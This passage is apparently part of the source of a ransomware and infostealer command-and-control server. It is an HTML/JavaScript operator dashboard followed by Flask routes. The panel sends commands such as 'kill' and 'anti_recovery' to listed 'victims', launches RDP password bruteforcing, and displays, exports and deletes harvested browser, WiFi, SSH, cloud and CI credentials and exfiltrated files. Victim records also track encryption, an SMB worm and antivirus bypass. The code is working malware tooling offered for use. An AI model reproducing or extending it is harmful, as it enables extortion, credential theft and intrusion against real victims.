                                    <button class="btn btn-sm btn-warning" onclick="sendCmd('{{ id }}', 'anti_recovery')">🔄 Anti-Recovery</button>
                                    <button class="btn btn-sm btn-danger" onclick="if(confirm('Kill victim {{ id }}?'))sendCmd('{{ id }}', 'kill')">✕ Kill</button>
                                </div>
                            </div>
                        {% endif %}
                    </div>
                </div>
                {% endfor %}
            {% else %}
                <div class="empty-state">
                    <div class="empty-icon">👻</div>
                    <div class="empty-title">No victims connected</div>
                    <div class="empty-desc">Waiting for connections...</div>
                </div>
            {% endif %}
        </div>

        <div class="tab-content" id="content-creds">
            <div class="exfil-toolbar">
                <div class="exfil-stats">
                    <div class="exfil-stat-item">
                        <span>🔑</span>
                        <span>Total Credentials:</span>
                        <span class="exfil-stat-value" id="creds-total">0</span>
                    </div>
                    <div class="exfil-stat-item">
                        <span>🌐</span>
                        <span>Browsers:</span>
                        <span class="exfil-stat-value" id="creds-browser">0</span>
                    </div>
                    <div class="exfil-stat-item">
                        <span>📶</span>
                        <span>WiFi:</span>
                        <span class="exfil-stat-value" id="creds-wifi">0</span>
                    </div>
                    <div class="exfil-stat-item">
                        <span>🔐</span>
                        <span>SSH:</span>
                        <span class="exfil-stat-value" id="creds-ssh">0</span>
                    </div>
                </div>
                <div style="display: flex; gap: 8px;">
                    <button class="btn btn-sm btn-primary" onclick="loadCreds()">🔄 Refresh</button>
                    <button class="btn btn-sm btn-success" onclick="exportCreds()">📥 Export JSON</button>
                    <button class="btn btn-sm btn-danger" onclick="clearCreds()">🗑 Clear All</button>
                </div>
            </div>

            <div id="creds-content">
                <div class="empty-state">
                    <div class="empty-icon">🔑</div>
                    <div class="empty-title">No credentials harvested yet</div>
                    <div class="empty-desc">Waiting for post-exploit data...</div>
                </div>
            </div>
        </div>

        <div class="tab-content" id="content-postex">
            <div class="exfil-toolbar">
                <div class="exfil-stats">
                    <div class="exfil-stat-item">
                        <span>🎯</span>
                        <span>Victims with Data:</span>
                        <span class="exfil-stat-value" id="postex-victims">0</span>
                    </div>
                </div>
                <div style="display: flex; gap: 8px;">
                    <button class="btn btn-sm btn-primary" onclick="loadPostEx()">🔄 Refresh</button>
                </div>
            </div>

            <div id="postex-content">
                <div class="empty-state">
                    <div class="empty-icon">🎯</div>
                    <div class="empty-title">No post-exploit data yet</div>
                </div>
            </div>
        </div>

        <div class="tab-content" id="content-exfil">
            <div class="exfil-toolbar">
                <div class="exfil-stats">
                    <div class="exfil-stat-item">
                        <span>📤</span>
                        <span>Total Files:</span>
                        <span class="exfil-stat-value" id="exfil-total-files">0</span>
                    </div>
                    <div class="exfil-stat-item">
                        <span>🎯</span>
                        <span>Victims:</span>
                        <span class="exfil-stat-value" id="exfil-total-victims">0</span>
                    </div>
                    <div class="exfil-stat-item">
                        <span>💾</span>
                        <span>Total Size:</span>
                        <span class="exfil-stat-value" id="exfil-total-size">0 B</span>
                    </div>
                </div>
                <div style="display: flex; gap: 8px;">
                    <button class="btn btn-sm btn-primary" onclick="loadExfilList()">🔄 Refresh</button>
                    <button class="btn btn-sm btn-success" onclick="openExfilFolder()">📂 Open Folder</button>
                </div>
            </div>

            <div id="exfil-content">
                <div class="empty-state">
                    <div class="empty-icon">📤</div>
                    <div class="empty-title">Loading...</div>
                </div>
            </div>
        </div>

        <div class="tab-content" id="content-history">
            <div class="history-list" id="history-content">
                {% for entry in command_history|reverse %}
                <div class="history-item">
                    <span class="history-time">{{ entry.timestamp }}</span>
                    <span class="history-victim">{{ entry.client_id }}</span>
                    <span class="history-command">→ {{ entry.command }}</span>
                    <span class="history-status">[{{ entry.status }}]</span>
                </div>
                {% endfor %}
            </div>
        </div>
    </div>

    <div id="bruteforce-modal" style="display:none; position:fixed; top:0; left:0;
     width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:9999;
     align-items:center; justify-content:center;">
    <div style="background:#161b22; border:1px solid #30363d; border-radius:8px;
                padding:24px; width:600px; max-width:90%;">
        <h3 style="color:#ff5555; margin-bottom:16px;">🔐 RDP Bruteforce</h3>

        <input type="hidden" id="bf-victim-id">

        <div style="margin-bottom:12px;">
            <label style="color:#8b949e; font-size:12px;">Target IP</label>
            <input type="text" id="bf-target" placeholder="192.168.1.100"
                   style="width:100%; padding:8px; background:#0d1117;
                          border:1px solid #30363d; border-radius:4px;
                          color:#e6edf3; margin-top:4px;">
        </div>

        <div style="display:grid; grid-template-columns:1fr 1fr; gap:12px;
                    margin-bottom:12px;">
            <div>
                <label style="color:#8b949e; font-size:12px;">Port</label>
                <input type="number" id="bf-port" value="3389"
                       style="width:100%; padding:8px; background:#0d1117;
                              border:1px solid #30363d; border-radius:4px;
                              color:#e6edf3;">
            </div>
            <div>
                <label style="color:#8b949e; font-size:12px;">Threads</label>
                <input type="number" id="bf-threads" value="4" min="1" max="20"
                       style="width:100%; padding:8px; background:#0d1117;
                              border:1px solid #30363d; border-radius:4px;
                              color:#e6edf3;">
            </div>
        </div>

        <div style="margin-bottom:12px;">
            <label style="color:#8b949e; font-size:12px;">
                Usernames (comma-separated)
            </label>
            <input type="text" id="bf-usernames"
                   value="administrator,admin,user,guest"
                   style="width:100%; padding:8px; background:#0d1117;
                          border:1px solid #30363d; border-radius:4px;
                          color:#e6edf3; margin-top:4px;">
        </div>

        <div style="margin-bottom:12px;">
            <label style="color:#8b949e; font-size:12px;">
                Passwords (comma-separated, empty = wordlist)
            </label>
            <textarea id="bf-passwords" rows="3"
                      placeholder="Password123, Admin123, P@ssw0rd"
                      style="width:100%; padding:8px; background:#0d1117;
                             border:1px solid #30363d; border-radius:4px;
                             color:#e6edf3; margin-top:4px;
                             font-family:monospace;"></textarea>
        </div>

        <div style="margin-bottom:12px;">
            <label style="color:#8b949e; font-size:12px;">
                Wordlist Path (optional)
            </label>
            <input type="text" id="bf-wordlist"
                   placeholder="/usr/share/wordlists/rockyou.txt"
                   style="width:100%; padding:8px; background:#0d1117;
                          border:1px solid #30363d; border-radius:4px;
                          color:#e6edf3; margin-top:4px;">
        </div>

        <div style="margin-bottom:12px;">
            <label style="color:#ffaa00; font-size:12px;">
                ⚠️ Safe mode: max
                <input type="number" id="bf-maxfails" value="5" min="1" max="20"
                       style="width:50px; background:#0d1117; border:1px solid #30363d;
                              border-radius:3px; color:#e6edf3; padding:2px;">
                failed attempts/user
            </label>
        </div>

        <div style="display:flex; gap:8px; justify-content:flex-end;">
            <button class="btn" onclick="closeBruteforceDialog()">Cancel</button>
            <button class="btn btn-danger" onclick="submitBruteforce()">
                🚀 Start Bruteforce
            </button>
        </div>
    </div>
</div>

    <script>
function openBruteforceDialog(victimId) {
    document.getElementById('bf-victim-id').value = victimId;
    document.getElementById('bruteforce-modal').style.display = 'flex';
}

function closeBruteforceDialog() {
    document.getElementById('bruteforce-modal').style.display = 'none';
}

function submitBruteforce() {
    const victimId = document.getElementById('bf-victim-id').value;
    const target = document.getElementById('bf-target').value.trim();
    const port = parseInt(document.getElementById('bf-port').value);
    const threads = parseInt(document.getElementById('bf-threads').value);
    const usernamesRaw = document.getElementById('bf-usernames').value;
    const passwordsRaw = document.getElementById('bf-passwords').value;
    const wordlist = document.getElementById('bf-wordlist').value.trim();
    const maxFails = parseInt(document.getElementById('bf-maxfails').value);

    if (!target) {
        showToast('❌ Target IP required', 'error');
        return;
    }

    const usernames = usernamesRaw.split(',').map(s => s.trim()).filter(s => s);
    const passwords = passwordsRaw.split(',').map(s => s.trim()).filter(s => s);

    const payload = {
        type: 'rdp_bruteforce',
        target: target,
        port: port,
        threads: threads,
        usernames: usernames,
        passwords: passwords.length ? passwords : null,
        wordlist: wordlist || null,
        max_fails: maxFails,
        safe_mode: true,
    };

    fetch('/send_command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            client_id: victimId,
            command: payload
        })
    })
    .then(r => r.json())
    .then(d => {
        if (!d.success) {
            showToast('❌ ' + d.message, 'error');
        } else {
            showToast('🚀 Bruteforce started', 'success');
        }
    })
    .catch(e => showToast('❌ ' + e, 'error'));

    closeBruteforceDialog();
}
</script>

    <script>
        function switchTab(tab) {
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            document.getElementById('tab-' + tab).classList.add('active');
            document.getElementById('content-' + tab).classList.add('active');

            if (tab === 'exfil') loadExfilList();
            if (tab === 'creds') loadCreds();
            if (tab === 'postex') loadPostEx();
        }

        function toggleVictim(id) {
            const card = document.getElementById('victim-' + id);
            card.classList.toggle('expanded');
        }

        function sendCmd(id, cmd) {
            fetch('/send_command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ client_id: id, command: { type: cmd } })
            })
            .then(r => r.json())
            .then(d => {
                if (!d.success) {
                    showToast('❌ Error: ' + d.message, 'error');
                } else {
                    showToast('✅ Command sent: ' + cmd, 'success');
                    setTimeout(() => location.reload(), 500);
                }
            })
            .catch(e => showToast('❌ Error: ' + e, 'error'));
        }

        function bulkCommand(cmd) {
            fetch('/bulk_command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ command: { type: cmd } })
            })
            .then(r => r.json())
            .then(d => {
                showToast(`✅ Sent to ${d.count}/${d.total} victims`, 'success');
                setTimeout(() => location.reload(), 800);
            })
            .catch(e => showToast('❌ Error: ' + e, 'error'));
        }

        function loadCreds() {
            const content = document.getElementById('creds-content');
            content.innerHTML = '<div class="empty-state"><div class="empty-icon">⏳</div><div class="empty-title">Loading...</div></div>';

            fetch('/credentials')
                .then(r => r.json())
                .then(data => {
                    const victims = Object.keys(data);
                    if (victims.length === 0) {
                        content.innerHTML = '<div class="empty-state"><div class="empty-icon">🔑</div><div class="empty-title">No credentials yet</div></div>';
                        document.getElementById('creds-total').textContent = '0';
                        document.getElementById('creds-browser').textContent = '0';
                        document.getElementById('creds-wifi').textContent = '0';
                        document.getElementById('creds-ssh').textContent = '0';
                        return;
                    }

                    let html = '';
                    let totalCreds = 0, browserCount = 0, wifiCount = 0, sshCount = 0;

                    victims.forEach(vid => {
                        const victimData = data[vid];
                        const creds = victimData.credentials || {};

                        let victimTotal = 0;
                        Object.values(creds).forEach(arr => {
                            if (Array.isArray(arr)) victimTotal += arr.length;
                        });

                        if (victimTotal === 0) return;

                        totalCreds += victimTotal;
                        browserCount += (creds.browser || []).length;
                        wifiCount += (creds.wifi || []).length;
                        sshCount += (creds.ssh || []).length;

                        html += `
                        <div class="exfil-victim">
                            <div class="exfil-victim-header">
                                <div class="exfil-victim-name">
                                    <span>🎯</span>
                                    <span>${escapeHtml(vid)}</span>
                                    <span class="exfil-victim-count">${victimTotal} credentials</span>
                                </div>
                            </div>
                            <div class="exfil-files-list">
                        `;

                        if (creds.browser && creds.browser.length > 0) {
                            html += `<div class="creds-section">
                                <div class="creds-section-title">🌐 Browser Credentials (${creds.browser.length})</div>`;

                            creds.browser.slice(0, 50).forEach(c => {
                                html += `
                                <div class="cred-row browser">
                                    <div class="cred-browser">${escapeHtml(c.browser || '')}</div>
                                    <div class="cred-url" title="${escapeHtml(c.url || '')}">${escapeHtml(c.url || '')}</div>
                                    <div class="cred-username">${escapeHtml(c.username || '')}</div>
                                    <div class="cred-password" onclick="copyText('${escapeJs(c.password || '')}')" title="Click to copy">
                                        ${escapeHtml(c.password || '')}
                                    </div>
                                </div>`;
                            });

                            if (creds.browser.length > 50) {
                                html += `<div style="color: var(--text-muted); font-size: 11px; padding: 4px; text-align: center;">
                                    ... and ${creds.browser.length - 50} more
                                </div>`;
                            }

                            html += `</div>`;
                        }

                        if (creds.wifi && creds.wifi.length > 0) {
                            html += `<div class="creds-section">
                                <div class="creds-section-title">📶 WiFi Passwords (${creds.wifi.length})</div>`;

                            creds.wifi.forEach(w => {
                                html += `
                                <div class="cred-row wifi">
                                    <div class="cred-username">${escapeHtml(w.ssid || '')}</div>
                                    <div class="cred-password" onclick="copyText('${escapeJs(w.password || '')}')" title="Click to copy">
                                        ${escapeHtml(w.password || '')}
                                    </div>
                                </div>`;
                            });

                            html += `</div>`;
                        }

                        if (creds.ssh && creds.ssh.length > 0) {
                            html += `<div class="creds-section">
                                <div class="creds-section-title">🔐 SSH Keys (${creds.ssh.length})</div>`;

                            creds.ssh.forEach(s => {
                                html += `
                                <div class="cred-key-block">
                                    <div class="cred-key-title">${escapeHtml(s.file || '')}</div>
                                    <div class="cred-key-content">${escapeHtml((s.content || '').substring(0, 400))}</div>
                                </div>`;
                            });

                            html += `</div>`;
                        }

                        if (creds.cloud && creds.cloud.length > 0) {
                            html += `<div class="creds-section">
                                <div class="creds-section-title">☁️ Cloud Credentials (${creds.cloud.length})</div>`;

                            creds.cloud.forEach(c => {
                                html += `
                                <div class="cred-key-block">
                                    <div class="cred-key-title">${escapeHtml(c.provider || '')}</div>
                                    <div class="cred-key-content">${escapeHtml((c.content || '').substring(0, 500))}</div>
                                </div>`;
                            });

                            html += `</div>`;
                        }

                        const otherKeys = ['git', 'docker', 'kubernetes', 'npm', 'ci_cd', 'env_files', 'database_clients', 'shell_history'];
                        let otherHtml = '';
                        otherKeys.forEach(key => {
                            if (creds[key] && creds[key].length > 0) {
                                otherHtml += `<div class="creds-section">
                                    <div class="creds-section-title">📁 ${key} (${creds[key].length})</div>`;
                                creds[key].slice(0, 20).forEach(c => {
                                    otherHtml += `
                                    <div class="cred-key-block">
                                        <div class="cred-key-title">${escapeHtml(c.path || c.file || c.type || '')}</div>
                                        <div class="cred-key-content">${escapeHtml((c.content || '').substring(0, 300))}</div>
                                    </div>`;
                                });
                                otherHtml += `</div>`;
                            }
                        });
                        html += otherHtml;

                        html += `</div></div>`;
                    });

                    content.innerHTML = html || '<div class="empty-state"><div class="empty-icon">🔑</div><div class="empty-title">No credentials</div></div>';

                    document.getElementById('creds-total').textContent = totalCreds;
                    document.getElementById('creds-browser').textContent = browserCount;
                    document.getElementById('creds-wifi').textContent = wifiCount;
                    document.getElementById('creds-ssh').textContent = sshCount;
                })
                .catch(e => {
                    content.innerHTML = `<div class="empty-state"><div class="empty-icon">❌</div><div class="empty-title">Error: ${e}</div></div>`;
                });
        }

        function exportCreds() {
            window.open('/credentials/export', '_blank');
        }

        function clearCreds() {
            if (!confirm('Clear ALL harvested credentials? This cannot be undone!')) return;

            fetch('/credentials/clear', { method: 'POST' })
                .then(r => r.json())
                .then(d => {
                    showToast(d.success ? '✅ Credentials cleared' : '❌ ' + d.error,
                             d.success ? 'success' : 'error');
                    loadCreds();
                });
        }

        function loadPostEx() {
            const content = document.getElementById('postex-content');
            content.innerHTML = '<div class="empty-state"><div class="empty-icon">⏳</div><div class="empty-title">Loading...</div></div>';

            fetch('/post_exploit')
                .then(r => r.json())
                .then(data => {
                    const victims = Object.keys(data);
                    if (victims.length === 0) {
                        content.innerHTML = '<div class="empty-state"><div class="empty-icon">🎯</div><div class="empty-title">No post-exploit data</div></div>';
                        document.getElementById('postex-victims').textContent = '0';
                        return;
                    }

                    let html = '';
                    victims.forEach(vid => {
                        const d = data[vid];
                        const sys = (d.discovery || {}).system || {};
                        const credsCount = Object.values(d.credentials || {}).reduce(
                            (s, arr) => s + (Array.isArray(arr) ? arr.length : 0), 0
                        );

                        html += `
                        <div class="postex-card">
                            <div class="exfil-victim-header">
                                <div class="exfil-victim-name">
                                    <span>🖥️</span>
                                    <span>${escapeHtml(vid)}</span>
                                    <span class="exfil-victim-count">${escapeHtml(sys.hostname || '?')}</span>
                                </div>
                            </div>
                            <div class="postex-grid">
                                <div class="postex-stat">
                                    <div class="postex-stat-label">CREDENTIALS</div>
                                    <div class="postex-stat-value" style="color: var(--accent-yellow);">${credsCount}</div>
                                </div>
                                <div class="postex-stat">
                                    <div class="postex-stat-label">USERS</div>
                                    <div class="postex-stat-value" style="color: var(--accent-blue);">${((d.discovery || {}).users || {}).users ? ((d.discovery || {}).users || {}).users.length : 0}</div>
                                </div>
                                <div class="postex-stat">
                                    <div class="postex-stat-label">SHARES</div>
                                    <div class="postex-stat-value" style="color: var(--accent-cyan);">${((d.discovery || {}).shares || {}).local ? ((d.discovery || {}).shares || {}).local.length : 0}</div>
                                </div>
                            </div>
                            <div class="postex-info">
                                <div><strong>OS:</strong> ${escapeHtml(sys.os || '?')} ${escapeHtml(sys.os_version || '')}</div>
                                <div><strong>User:</strong> ${escapeHtml(sys.user || '?')} (admin: ${sys.is_admin ? '✅' : '❌'})</div>
                                <div><strong>Hostname:</strong> ${escapeHtml(sys.hostname || '?')}</div>
                                <div><strong>Timestamp:</strong> ${escapeHtml((d.metadata || {}).timestamp || '?')}</div>
                            </div>
                            <div style="padding: 8px 12px; display: flex; gap: 8px;">
                                <button class="btn btn-sm btn-primary" onclick="switchTab('creds')">🔑 View Credentials</button>
                                <button class="btn btn-sm btn-success" onclick="window.open('/post_exploit/download/${encodeURIComponent(vid)}','_blank')">📥 Download JSON</button>
                            </div>
                        </div>`;
                    });

                    content.innerHTML = html;
                    document.getElementById('postex-victims').textContent = victims.length;
                })
                .catch(e => {
                    content.innerHTML = `<div class="empty-state"><div class="empty-icon">❌</div><div class="empty-title">Error: ${e}</div></div>`;
                });
        }

        function loadExfilList() {
            const content = document.getElementById('exfil-content');
            content.innerHTML = '<div class="empty-state"><div class="empty-icon">⏳</div><div class="empty-title">Loading...</div></div>';

            fetch('/exfiltrated')
                .then(r => r.json())
                .then(data => {
                    const victims = Object.keys(data);
                    if (victims.length === 0) {
                        content.innerHTML = '<div class="empty-state"><div class="empty-icon">📤</div><div class="empty-title">No exfiltrated files yet</div></div>';
                        return;
                    }
                    let html = '';
                    let totalFiles = 0, totalSize = 0;
                    victims.sort().forEach(vid => {
                        const files = data[vid];
                        totalFiles += files.length;
                        files.forEach(f => totalSize += f.size);
                        html += `<div class="exfil-victim"><div class="exfil-victim-header"><div class="exfil-victim-name"><span>🖥️</span><span>${escapeHtml(vid)}</span><span class="exfil-victim-count">${files.length} file${files.length !== 1 ? 's' : ''}</span></div></div><div class="exfil-files-list">`;
                        files.forEach(f => {
                            const sizeStr = formatSize(f.size);
                            const icon = getFileIcon(f.name);
                            html += `<div class="exfil-file-row"><div class="exfil-file-info"><div class="exfil-file-icon">${icon}</div><div class="exfil-file-details"><div class="exfil-file-name">${escapeHtml(f.name)}</div><div class="exfil-file-meta"><span>💾 ${sizeStr}</span><span>🕒 ${f.modified}</span></div></div></div><div class="exfil-file-actions"><a href="/exfiltrated/${encodeURIComponent(vid)}/${encodeURIComponent(f.name)}" download class="btn btn-sm btn-primary">⬇️ Download</a><button class="btn btn-sm btn-danger" onclick="deleteExfilFile('${escapeJs(vid)}', '${escapeJs(f.name)}')">🗑️</button></div></div>`;
                        });
                        html += `</div></div>`;
                    });
                    content.innerHTML = html;
                    document.getElementById('exfil-total-files').textContent = totalFiles;
                    document.getElementById('exfil-total-victims').textContent = victims.length;
                    document.getElementById('exfil-total-size').textContent = formatSize(totalSize);
                })
                .catch(e => {
                    content.innerHTML = `<div class="empty-state"><div class="empty-icon">❌</div><div class="empty-title">Error: ${e}</div></div>`;
                });
        }

        function deleteExfilFile(vid, filename) {
            if (!confirm(`Delete "${filename}"?`)) return;
            fetch('/delete_exfil', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ victim_id: vid, filename: filename })
            })
            .then(r => r.json())
            .then(d => {
                if (d.success) {
                    showToast('✅ File deleted', 'success');
                    loadExfilList();
                } else {
                    showToast('❌ Error: ' + d.error, 'error');
                }
            });
        }

        function openExfilFolder() {
            fetch('/open_exfil_folder')
                .then(r => r.json())
                .then(d => showToast(d.success ? '📂 Folder opened' : '❌ ' + d.error, d.success ? 'success' : 'error'));
        }

        function formatSize(bytes) {
            if (bytes < 1024) return bytes + ' B';
            if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
            if (bytes < 1024 * 1024 * 1024) return (bytes / (1024 * 1024)).toFixed(2) + ' MB';
            return (bytes / (1024 * 1024 * 1024)).toFixed(2) + ' GB';
        }

        function getFileIcon(filename) {
            const ext = (filename.split('.').pop() || '').toLowerCase();
            const icons = {
                'txt': '📄', 'doc': '📝', 'docx': '📝', 'pdf': '📕',
                'jpg': '🖼️', 'jpeg': '🖼️', 'png': '🖼️', 'gif': '🖼️',
                'mp4': '🎬', 'avi': '🎬', 'mkv': '🎬',
                'mp3': '🎵', 'wav': '🎵',
                'zip': '📦', 'rar': '📦', '7z': '📦',
                'py': '🐍', 'js': '📜', 'html': '🌐',
                'exe': '⚙️', 'dll': '⚙️',
                'xls': '📊', 'xlsx': '📊', 'csv': '📊',
            };
            return icons[ext] || '📄';
        }

        function escapeHtml(s) {
            const div = document.createElement('div');
            div.textContent = s || '';
            return div.innerHTML;
        }

        function escapeJs(s) {
            return (s || '').replace(/\\\\/g, '\\\\\\\\').replace(/'/g, "\\\\'").replace(/"/g, '\\\\"');
        }

        function copyText(text) {
            navigator.clipboard.writeText(text).then(() => {
                showToast('📋 Copied: ' + (text || '').substring(0, 32), 'success');
            });
        }

        function showToast(message, type = 'info') {
            const toast = document.createElement('div');
            toast.style.cssText = `
                position: fixed; bottom: 24px; right: 24px;
                background: ${type === 'error' ? '#da3633' : type === 'success' ? '#238636' : '#1f6feb'};
                color: white; padding: 12px 20px; border-radius: 8px;
                font-size: 13px; font-weight: 500;
                box-shadow: 0 4px 12px rgba(0,0,0,0.4);
                z-index: 10000;
            `;
            toast.textContent = message;
            document.body.appendChild(toast);
            setTimeout(() => toast.remove(), 3000);
        }

        setTimeout(() => {
            const activeTab = document.querySelector('.tab-btn.active');
            if (activeTab && activeTab.id === 'tab-victims') {
                location.reload();
            }
        }, 15000);
    </script>
</body>
</html>
            """

            # ═══ ROUTES ═══
            @app.route("/")
            @login_required
            def index():
                with self.lock:
                    total_count = len(self.victims)
                    online_count = sum(
                        1
                        for v in self.victims.values()
                        if v.get("registered")
                        and v["status"]
                        in ["registered", "active", "encrypted", "decrypted"]
                    )
                    admin_count = sum(1 for v in self.victims.values() if v["is_admin"])
                    encrypted_count = sum(
                        1 for v in self.victims.values() if v.get("encrypted")
                    )
                    total_creds = sum(
                        v.get("creds_count", 0) for v in self.victims.values()
                    )
                    hybrid_count = sum(
                        1
                        for v in self.victims.values()
                        if v.get("encryption_mode") == "hybrid"
                    )

                    victims_data = {}
                    for vid, v in self.victims.items():
                        victims_data[vid] = {
                            "ip": v.get("ip", "unknown"),
                            "port": v.get("port", "unknown"),
                            "hostname": v.get("hostname", "unknown"),
                            "os": v.get("os", "unknown"),
                            "user": v.get("user", "unknown"),
                            "is_admin": v.get("is_admin", False),
                            "status": v.get("status", "unknown"),
                            "registered": v.get("registered", False),
                            "encrypted": v.get("encrypted", False),
                            "encrypted_count": v.get("encrypted_count", 0),
                            "exfiltrated_count": v.get("exfiltrated_count", 0),
                            "decrypt_key": v.get("decrypt_key", ""),
                            "encryption": v.get("encryption", ""),
                            "encryption_mode": v.get("encryption_mode", "unknown"),
                            "victim_id": v.get("victim_id", ""),
                            "key_fingerprint": v.get("key_fingerprint", ""),
                            "byovd_enabled": v.get("byovd_enabled", False),
                            "smb_worm_enabled": v.get("smb_worm_enabled", False),
                            "av_bypass": v.get("av_bypass", False),
                            "last_seen": v.get("last_seen", ""),
                            "creds_count": v.get("creds_count", 0),
                        }

                    history = list(self.command_history[-40:])

                return render_template_string(
                    HTML_TEMPLATE,
                    victims=victims_data,
                    total_count=total_count,
                    online_count=online_count,
                    admin_count=admin_count,
                    encrypted_count=encrypted_count,
                    hybrid_count=hybrid_count,
                    total_creds=total_creds,
                    command_history=history,
                    session_username=session.get("username", "admin"),
                )

            @app.route("/send_command", methods=["POST"])
            @login_required
            def send_command_route():
                if not request.is_json:
                    return jsonify({"success": False, "message": "Invalid request"})
                data = request.get_json()
                client_id = data.get("client_id")
                command = data.get("command", {})
                if not client_id or not command:
                    return jsonify(
                        {"success": False, "message": "Missing client_id or command"}
                    )
                success, message = self.send_command(client_id, command)
                return jsonify({"success": success, "message": message})

            @app.route("/bulk_command", methods=["POST"])
            @login_required
            def bulk_command_route():
                if not request.is_json:
                    return jsonify({"success": False, "message": "Invalid request"})
                data = request.get_json()
                command = data.get("command", {})
                if not command:
                    return jsonify({"success": False, "message": "Missing command"})
                results = self.send_command_all(command)
                success_count = sum(1 for _, ok, _ in results if ok)
                return jsonify(
                    {"success": True, "count": success_count, "total": len(results)}
                )

            @app.route("/victims")
            @login_required
            def victims_api():
                with self.lock:
                    victims_data = {}
                    for vid, v in self.victims.items():
                        victims_data[vid] = {
                            "ip": v.get("ip"),
                            "port": v.get("port"),
                            "hostname": v.get("hostname"),
                            "os": v.get("os"),
                            "user": v.get("user"),
                            "is_admin": v.get("is_admin"),
                            "status": v.get("status"),
                            "registered": v.get("registered", False),
                            "encrypted": v.get("encrypted"),
                            "encrypted_count": v.get("encrypted_count"),
                            "exfiltrated_count": v.get("exfiltrated_count", 0),
                            "victim_id": v.get("victim_id", ""),
                            "key_fingerprint": v.get("key_fingerprint", ""),
                            "encryption_mode": v.get("encryption_mode", "unknown"),
                            "creds_count": v.get("creds_count", 0),
                        }
                return jsonify(victims_data)

            @app.route("/history")
            @login_required
            def history_api():
                with self.lock:
                    return jsonify(self.command_history[-200:])

            @app.route("/credentials")
            @login_required
            def credentials_api():
                result = {}
                if os.path.isdir(self.post_exploit_dir):
                    for fname in os.listdir(self.post_exploit_dir):
                        if not fname.endswith("_post_exploit.json"):
                            continue
                        try:
                            fpath = os.path.join(self.post_exploit_dir, fname)
                            with open(fpath, "r") as f:
                                data = json.load(f)
                            victim_id = fname.split("_post_exploit")[0]
                            result[victim_id] = {
                                "credentials": data.get("credentials", {}),
                                "discovery": data.get("discovery", {}),
                                "exfiltration": data.get("exfiltration", {}),
                                "metadata": data.get("metadata", {}),
                                "file": fname,
                            }
                        except Exception as e:
                            print(f"[!] Load creds error: {e}")
                return jsonify(result)

            @app.route("/credentials/export")
            @login_required
            def credentials_export():
                result = {}
                if os.path.isdir(self.post_exploit_dir):
                    for fname in os.listdir(self.post_exploit_dir):
                        if not fname.endswith("_post_exploit.json"):
                            continue
                        try:
                            fpath = os.path.join(self.post_exploit_dir, fname)
                            with open(fpath, "r") as f:
                                result[fname] = json.load(f)
                        except Exception:
                            pass
                json_data = json.dumps(result, indent=2, default=str)
                return Response(
                    json_data,
                    mimetype="application/json",
                    headers={
                        "Content-Disposition": f"attachment;filename=credentials_{int(time.time())}.json"
                    },
                )

            @app.route("/credentials/clear", methods=["POST"])
            @login_required
            def credentials_clear():
                try:
                    if os.path.isdir(self.post_exploit_dir):
                        for fname in os.listdir(self.post_exploit_dir):
                            if fname.endswith("_post_exploit.json"):
                                try:
                                    os.remove(
                                        os.path.join(self.post_exploit_dir, fname)
                                    )
                                except Exception:
                                    pass
                    return jsonify({"success": True})
                except Exception as e:
                    return jsonify({"success": False, "error": str(e)})

            @app.route("/post_exploit")
            @login_required
            def post_exploit_api():
                result = {}
                if os.path.isdir(self.post_exploit_dir):
                    for fname in os.listdir(self.post_exploit_dir):
                        if not fname.endswith("_post_exploit.json"):
                            continue
                        try:
                            fpath = os.path.join(self.post_exploit_dir, fname)
                            with open(fpath, "r") as f:
                                data = json.load(f)
                            victim_id = fname.split("_post_exploit")[0]
                            result[victim_id] = data
                        except Exception:
                            pass
                return jsonify(result)

            @app.route("/post_exploit/download/<victim_id>")
            @login_required
            def post_exploit_download(victim_id):
                victim_id = os.path.basename(victim_id)
                if os.path.isdir(self.post_exploit_dir):
                    for fname in os.listdir(self.post_exploit_dir):
                        if fname.startswith(victim_id) and fname.endswith(
                            "_post_exploit.json"
                        ):
                            return send_from_directory(
                                self.post_exploit_dir, fname, as_attachment=True
                            )
                return jsonify({"error": "not found"}), 404

            @app.route("/exfiltrated")
            @login_required
            def exfiltrated_api():
                result = {}
                try:
                    if os.path.exists(self.exfil_dir):
                        for victim_id in sorted(os.listdir(self.exfil_dir)):
                            victim_path = os.path.join(self.exfil_dir, victim_id)
                            if os.path.isdir(victim_path):
                                files = []
                                for f in sorted(os.listdir(victim_path)):
                                    fpath = os.path.join(victim_path, f)
                                    if os.path.isfile(fpath):
                                        files.append(
                                            {
                                                "name": f,
                                                "size": os.path.getsize(fpath),
                                                "modified": datetime.fromtimestamp(
                                                    os.path.getmtime(fpath)
                                                ).strftime("%Y-%m-%d %H:%M:%S"),
                                            }
                                        )
                                result[victim_id] = files
                except Exception as e:
                    return jsonify({"error": str(e)})
                return jsonify(result)

            @app.route("/exfiltrated/<victim_id>/<filename>")
            @login_required
            def download_exfiltrated(victim_id, filename):
                victim_id = os.path.basename(victim_id)
                filename = os.path.basename(filename)
                victim_dir = os.path.join(self.exfil_dir, victim_id)
                if not os.path.exists(victim_dir):
                    return jsonify({"error": "victim not found"}), 404
                if not os.path.exists(os.path.join(victim_dir, filename)):
                    return jsonify({"error": "file not found"}), 404
                return send_from_directory(victim_dir, filename, as_attachment=True)

            @app.route("/delete_exfil", methods=["POST"])
            @login_required
            def delete_exfil():
                if not request.is_json:
                    return jsonify({"success": False, "error": "Invalid request"})
                data = request.get_json()
                victim_id = os.path.basename(data.get("victim_id", ""))
                filename = os.path.basename(data.get("filename", ""))
                if not victim_id or not filename:
                    return jsonify({"success": False, "error": "Missing parameters"})
                try:
                    fpath = os.path.join(self.exfil_dir, victim_id, filename)
                    if not os.path.abspath(fpath).startswith(
                        os.path.abspath(self.exfil_dir)
                    ):
                        return jsonify({"success": False, "error": "Invalid path"})
                    if os.path.exists(fpath):
                        os.remove(fpath)
                        return jsonify({"success": True})
                    else:
                        return jsonify({"success": False, "error": "File not found"})
                except Exception as e:
                    return jsonify({"success": False, "error": str(e)})

            @app.route("/open_exfil_folder")
            @login_required
            def open_exfil_folder():
                try:
